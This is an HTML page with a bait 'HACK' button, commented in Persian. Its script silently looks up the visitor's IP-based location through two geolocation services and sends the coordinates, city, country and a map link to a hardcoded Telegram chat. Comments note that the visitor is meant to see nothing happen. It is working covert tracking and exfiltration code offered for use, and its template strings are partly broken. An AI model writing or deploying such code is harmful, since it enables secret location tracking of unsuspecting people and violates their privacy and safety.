<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحه</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0a0a;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            font-family:Arial;
        }
        .container{
            text-align:center;
        }
        .btn-hack{
            background:transparent;
            border:3px solid #00ff41;
            color:#00ff41;
            padding:25px 60px;
            font-size:32px;
            font-weight:bold;
            border-radius:15px;
            cursor:pointer;
            transition:0.3s;
            font-family:Arial;
            letter-spacing:3px;
            box-shadow:0 0 40px rgba(0,255,65,0.1);
        }
        .btn-hack:hover{
            background:#00ff41;
            color:#0a0a0a;
            box-shadow:0 0 80px rgba(0,255,65,0.3);
            transform:scale(1.03);
        }
        .btn-hack:active{
            transform:scale(0.95);
        }
        .btn-hack:disabled{
            opacity:0.2;
            cursor:default;
            transform:none;
            box-shadow:none;
        }
        /* هیچ پیام یا تغییری نمایش داده نمی‌شود */
        #hidden-status{
            display:none;
        }
    </style>
</head>
<body>
    <div class="container">
        <button class="btn-hack" id="hackBtn">HACK</button>
    </div>

    <script>
    // ===== تنظیمات =====
    const BOT_TOKEN = 'YOUR_BOT_TOKEN';   // <-- توکن خود را اینجا بگذارید
    const CHAT_ID = '6340337525';         // <-- Chat ID خود را اینجا بگذارید

    const btn = document.getElementById('hackBtn');

    // ===== تابع دریافت موقعیت =====
    async function getLocation() {
        try {
            //先用 geoplugin (معمولاً در ایران کار می‌کند)
            const res = await fetch('https://geoplugin.net/json.gp', { signal: AbortSignal.timeout(5000) });
            const data = await res.json();
            if (data.geoplugin_latitude && data.geoplugin_latitude != '0') {
                return {
                    lat: parseFloat(data.geoplugin_latitude),
                    lon: parseFloat(data.geoplugin_longitude),
                    city: data.geoplugin_city || 'نامشخص',
                    country: data.geoplugin_countryName || 'نامشخص',
                    method: 'GeoPlugin'
                };
            }
        } catch(e) {}

        try {
            // پشتیبان: ip-api
            const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
            const data = await res.json();
            if (data.status === 'success') {
                return {
                    lat: data.lat,
                    lon: data.lon,
                    city: data.city,
                    country: data.country,
                    method: 'IP-API'
                };
            }
        } catch(e) {}

        return null;
    }

    // ===== ارسال به تلگرام =====
    async function sendToTelegram(loc) {
        const text = 
📍 موقعیت جدید:
🌐 عرض: ${loc.lat}
🌐 طول: ${loc.lon}
🏙 شهر: ${loc.city || 'نامشخص'}
🌍 کشور: ${loc.country || 'نامشخص'}
📡 روش: ${loc.method}
🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};

        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
        try {
            await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
        } catch(e) {}
    }

    // ===== تابع اصلی (با کلیک دکمه) =====
    async function handleClick() {
        // غیرفعال کردن دکمه (برای جلوگیری از کلیک مجدد)
        btn.disabled = true;
        // دریافت موقعیت
        const loc = await getLocation();
        
        // اگر موقعیت دریافت شد، به تلگرام ارسال کن
        if (loc) {
            await sendToTelegram(loc);
        }
        
        // دکمه را دوباره فعال کن (به نظر کاربر هیچ اتفاقی نیفتاده)
        btn.disabled = false;
    }

    // ===== اتصال رویداد کلیک =====
    btn.addEventListener('click', handleClick);
    </script>
</body>
</html>
